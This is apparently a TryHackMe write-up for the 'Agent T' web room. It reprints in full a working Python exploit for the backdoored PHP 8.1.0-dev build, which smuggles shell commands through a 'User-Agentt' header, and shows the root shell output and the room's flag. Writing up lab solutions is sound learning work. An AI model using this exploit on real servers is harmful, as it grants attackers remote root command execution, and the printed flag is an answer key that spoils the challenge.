## Agent T - TryHackMe Writeup

[Room Link](https://tryhackme.com/room/agentt)

<i>Agent T uncovered this website, which looks innocent enough, but something seems off about how the server responds...

After deploying the vulnerable machine attached to this task, please wait a couple of minutes for it to respond.</i>

**IP: 10.10.131.19**

---

## 📌 General Information

**Room Difficulty**: Easy  <br>

**Room Type**: Web <br>

**Tools Used**: Burp Suite<br>

**Author**: <br>

[<img align='center' src="https://github.com/mauzware/mauzware/blob/main/LOGO%20NEW.png"/>](https://github.com/mauzware)

[TryHackMe Profile](https://tryhackme.com/p/mauzinho) <br>
[GitHub Profile](https://github.com/mauzware)

---

## 🌐 Web Exploitation 

- I found nothing with Burp, nor in the app, nor in the source code so I pivoted to looking for exploits. I found this [exploit](https://www.exploit-db.com/exploits/49933) for `PHP 8.1.0-dev - 'User-Agentt' Remote Code Execution`.

  ```
  #!/usr/bin/env python3
  import os
  import re
  import requests
  
  host = input("Enter the full host url:\n")
  request = requests.Session()
  response = request.get(host)
  
  if str(response) == '<Response [200]>':
      print("\nInteractive shell is opened on", host, "\nCan't acces tty; job crontol turned off.")
      try:
          while 1:
              cmd = input("$ ")
              headers = {
              "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0",
              "User-Agentt": "zerodiumsystem('" + cmd + "');"
              }
              response = request.get(host, headers = headers, allow_redirects = False)
              current_page = response.text
              stdout = current_page.split('<!DOCTYPE html>',1)
              text = print(stdout[0])
      except KeyboardInterrupt:
          print("Exiting...")
          exit
  
  else:
      print("\r")
      print(response)
      print("Host is not available, aborting...")
      exit
  ```
  
- Simply, just run the exploit and read the flag.

  ```
  python3 exploit.py                                                          
  Enter the full host url:
  http://10.10.131.19/
  
  Interactive shell is opened on http://10.10.131.19/ 
  Can't acces tty; job crontol turned off.
  $ whoami
  root
  
  $ id
  uid=0(root) gid=0(root) groups=0(root)
  
  $ pwd
  /var/www/html
  
  $ ls -al
  total 760
  drwxr-xr-x 1 root root   4096 Mar  7  2022 .
  drwxr-xr-x 1 root root   4096 Mar 30  2021 ..
  -rw-rw-r-- 1 root root    199 Mar  5  2022 .travis.yml
  -rw-rw-r-- 1 root root  22113 Mar  5  2022 404.html
  -rw-rw-r-- 1 root root  21756 Mar  5  2022 blank.html
  drwxrwxr-x 2 root root   4096 Mar  5  2022 css
  -rw-rw-r-- 1 root root   3784 Mar  5  2022 gulpfile.js
  drwxrwxr-x 2 root root   4096 Mar  5  2022 img
  -rw-rw-r-- 1 root root  42145 Mar  7  2022 index.php
  drwxrwxr-x 3 root root   4096 Mar  5  2022 js
  -rw-rw-r-- 1 root root 642222 Mar  5  2022 package-lock.json
  -rw-rw-r-- 1 root root   1493 Mar  5  2022 package.json
  drwxrwxr-x 4 root root   4096 Mar  5  2022 scss
  drwxrwxr-x 8 root root   4096 Mar  5  2022 vendor
  
  $ find / -name flag.txt 2>/dev/null
  /flag.txt
  
  $ cat /flag.txt 
  flag{4127d0530abf16d6d23973e3df8dbecb}
  ```

---

## 🏁 Flags

- **Flag**: `flag{4127d0530abf16d6d23973e3df8dbecb}`

---

## 💬 Notes & Reflections

- What was challenging in this room for me?
  `Nothing.`

- What did I learn?
  `Found a new exploit.`

- I would recommend this room or any type of CTF challenge to every Cyber Security enthusiast since it will sharpen your skills better than any book/tutorial/course or walkthrough rooms on many different platforms!

- Thank you for reading! Enjoy, Have Fun and Happy Hacking! 🤟

---
